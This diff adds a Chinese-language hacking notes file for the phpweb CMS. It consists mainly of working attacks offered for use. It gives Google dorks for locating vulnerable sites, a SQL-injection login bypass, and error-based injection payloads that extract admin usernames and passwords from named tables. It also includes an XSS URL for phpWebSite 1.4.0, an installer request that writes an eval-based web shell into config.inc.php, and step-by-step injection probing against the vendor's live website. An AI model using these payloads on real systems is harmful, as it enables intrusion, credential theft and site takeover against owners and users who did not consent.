@@ -1,0 +1,88 @@
+       【 phpweb 】
+收集   By:Moox   QQ791884728
+admin' or '1'='1  万能密码
+inurl:/class/?1.html
+
+inurl:webmall/query.php?typeid=?
+inurl:shop/class/?226.html
+inurl:product/html/?10.html
+inurl:down/class/?2.html
+inurl:news/html/?417.html
+inurl:shop/html/?477.html
+inurl:news/class/?86.html
+
+
+
+inurl:/page/html/?1.html
+exp   /search/index.php?imageField.x=-1138&imageField.y=-319&key=1%27
+inurl:class/index.php?catid=0
+exp   /3149_4369/product/html/?78'and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x27,0x7e,user,0x27,0x7e,password,0x27,0x7e)/**/from/**/dev_base_admin/**/limit/**/0,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/*.html
+
+
+关键字：inurl:down/class/index.php?myord=
+
+后台地址：admin.php
+
+万能密码：admin 'or '1'='1
+
+注入地址：down/class/index.php?myord=1
+
+
+关键字：inurl:webmall/detail.php?id
+
+数据表：pwn_base_admin
+
+关键字：inurl:webmall/detail.php?id
+
+数据表：pwn_base_admin
+ 
+phpWebSite搜索模块跨站脚本执行漏洞
+受影响系统：
+
+Appalachian State Universit phpWebSite 1.4.0
+
+phpWebSite是一款网站内容管理系统(CMS)。
+利用方法
+index.php?module=search&user=search&search=%22%3E%3Ch1%3EXSS%3C%2Fh1%3E&alternate=local&mod_title=all&submit=Search
+
+
+
+
+phpweb成品网站最新版(注入、上传、写shell)
+
+漏洞文件:
+inurl:search/module/search.php
+inurl:search/index.php?key=1&myord=1 [sqlinjection]
+
+base/install/index.php --data 
+"dbhost=localhost&dbname=phpweb&dbuser=root&dbpwd=root&tablepre=pwn&nextstep=3&command=gonext&alertmsg=&username=" --header "HOST:localhost\";eval($_REQUEST[a]);#"
+shell地址: /config.inc.php
+
+
+
+inurl:shop/class/index.php?showbrandid=1 
+
+
+AND (SELECT 1 FROM (SELECT count( * ) , concat((SELECT concat( 0×23, user, 0x7e,password, 0×23 ) FROM dev_base_admin limit 0,1),floor( rand( 0 ) *2 ))x FROM information_schema.tables GROUP BY x)a)–%20
+
+
+
+phpweb所有的整站程序伪静态页面都存在sql注入
+
+主站：http://phpweb.net/
+加’检测：
+ 
+http://www.phpweb.net/down/html/?772′.html
+ 
+出错
+存在注入。
+不能用空格，只能用/*罗
+http://www.phpweb.net/page/html/?56′/**/and/**/1=1/*.html 正常
+ 
+http://www.phpweb.net/page/html/?56′/**/and/**/1=2/*.html 出错.
+爆数据库版本：
+ 
+?
+1
+http://www.phpweb.net/page/html/?56'/**/and/**/(SELECT/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),(substring((select(version())),1,62)))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b)=1/*.html
+
